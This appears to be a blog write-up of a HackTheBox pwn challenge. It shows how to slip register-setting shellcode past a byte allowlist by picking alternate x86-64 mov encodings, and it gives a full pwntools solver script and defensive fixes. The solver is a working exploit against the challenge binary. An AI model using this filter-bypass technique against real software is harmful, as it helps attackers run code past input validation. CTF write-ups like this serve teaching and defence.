---
layout: post
title: "Reconstruction"
date: 2027-11-05 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, shellcode, executable-stack, allowlist-bypass, encoding]
---

One of the Council's "divine weapons" has its *registers* misaligned. The binary maps an executable page, accepts your bytes, runs them through a tiny byte allowlist, and then **executes** them — so this is a shellcode challenge with a twist: you may only use a handful of opcode bytes. The goal is to set seven registers (`r8, r9, r10, r12, r13, r14, r15`) to fixed magic values using only the permitted bytes. The whole solve is a 60-byte payload built from two cleverly-chosen `mov` encodings.

## Overview

- **Category:** Pwn · **Difficulty:** Easy
- **Protections:** PIE, Full RELRO, stack canary — but **executable stack / RWX segments** (`checksec`: `Stack: Executable`, `Has RWX segments`).
- **Path:** pass a `strncmp` gate → send register-setting [shellcode](https://cwe.mitre.org/data/definitions/184.html) whose every byte is in the validator's allowlist → the program executes it, the registers match, the flag is printed.

## The technique

The interesting function, `check()`, does four things:

1. `mmap`s a 60-byte page with `PROT_READ|PROT_WRITE|PROT_EXEC` (a RWX page).
2. `read(0, buf, 0x3c)` — reads up to 60 attacker bytes and copies them onto the page.
3. `validate_payload()` walks the first 59 bytes and **rejects the whole payload if any byte is not in a hardcoded `allowed_bytes` set.**
4. `call`s the page — i.e. **executes our bytes** — then checks that the seven registers equal a `values[]` table.

Pulled straight from `.data`:

```text
required:  r8=0x1337c0de r9=0xdeadbeef r10=0xdead1337 r12=0x1337cafe
           r13=0xbeefc0de r14=0x13371337 r15=0x1337dead
allowed_bytes = 49 c7 b9 c0 de 37 13 c4 c6 ef be ad ca fe c3 00 ba bd
```

The trap: a byte allowlist is **not** an instruction allowlist. x86-64 has more than one encoding for `mov rN, imm`, and two of them — between them — reach all seven registers using only the allowed bytes:

- **`49 C7 /0 imm32`** = `mov r/m64, imm32` (sign-extended). The ModRM byte is `C0 + (reg & 7)`, so `C0`=r8, `C4`=r12, `C6`=r14, `C7`=r15. (`C7` is also the opcode byte, so r15 needs no extra allowed byte.)
- **`49 B8+r imm64`** = `movabs rN, imm64`, giving `B9`=r9, `BA`=r10, `BD`=r13 — exactly the registers whose `C7`-ModRM byte (`C1/C2/C5`) is *not* in the allowlist.

The target immediate values were chosen so their bytes (`de c0 37 13 fe ca ad ef be …`) are already in `allowed_bytes`. End the payload with `c3` (`ret`).

One subtlety: `r8/r9/r10` are caller-saved, yet they still hold our values when the check runs — because the only function called between our `ret` and the register comparison is `munmap`, whose libc wrapper is a bare `syscall`, and Linux syscalls clobber only `rax`, `rcx`, and `r11`.

## Solution

The full, commented solver is below. Run it against a spawned instance with `python3 solve.py <host> <port>`.

```python
#!/usr/bin/env python3
# Reconstruction (HTB pwn) — constrained, allowlisted-byte shellcode.
# check() mmaps a RWX page, reads 60 bytes, rejects any byte not in allowed_bytes,
# then CALLs the page and requires r8/r9/r10/r12/r13/r14/r15 == fixed values[].
#   49 C7 /0 imm32  -> ModRM C0=r8 C4=r12 C6=r14 C7=r15  (all allowed)
#   49 B8+r imm64   -> B9=r9 BA=r10 BD=r13               (all allowed)
import sys
from pwn import *
context.arch = 'amd64'

ALLOWED = bytes.fromhex('49c7b9c0de3713c4c6efbeadcafec300babd')

def mov_c7(modrm, imm32):      # 49 C7 <modrm> imm32  (sign-extended to 64)
    return b'\x49\xc7' + bytes([modrm]) + p32(imm32)

def movabs(opc, imm64):        # 49 <B8+r> imm64
    return b'\x49' + bytes([opc]) + p64(imm64)

sc  = mov_c7(0xc0, 0x1337c0de)   # r8
sc += movabs(0xb9, 0xdeadbeef)   # r9
sc += movabs(0xba, 0xdead1337)   # r10
sc += mov_c7(0xc4, 0x1337cafe)   # r12
sc += movabs(0xbd, 0xbeefc0de)   # r13
sc += mov_c7(0xc6, 0x13371337)   # r14
sc += mov_c7(0xc7, 0x1337dead)   # r15
sc += b'\xc3'                    # ret
assert all(b in ALLOWED for b in sc), 'disallowed byte'
sc += b'\x00'                    # 60th byte so read(0,buf,0x3c) returns without EOF

io = remote(sys.argv[1], int(sys.argv[2]))
io.send(b'fix\n')   # main: strncmp(input, "fix", 3) gate
io.send(sc)         # check: the reconstruction payload (60 bytes)
print(io.recvall(timeout=10).decode(errors='replace'))
```

The result is a flag of the form `HTB{...}` (redacted here).

## Why it worked

The validator filtered the wrong thing. It enforced a small **byte** allowlist over executable input, assuming a tiny set of bytes can't express anything useful — but instruction sets are redundant, and the same semantic effect (load a constant into a register) is reachable through a different opcode whose bytes happen to be allowed. This is the same class of mistake as alphanumeric-shellcode and charset-based SQL/XSS filters: an allowlist that operates on raw bytes instead of decoded instructions is incomplete by construction.

## Fix / defense

- **Never `call` attacker-supplied bytes.** If a sandbox truly must run them, enforce W^X — write the page, then `mprotect` it to `R-X`, never keep it RWX — and confine it with a seccomp **syscall** allowlist.
- **Validate at the instruction level, not the byte level.** Disassemble and allow/deny by decoded semantics; equivalent encodings defeat any raw-byte filter.
- Treat every byte/charset filter over executable or interpreted input as bypassable, and prefer structural validation (parse, then re-emit) over denylists/allowlists of characters.
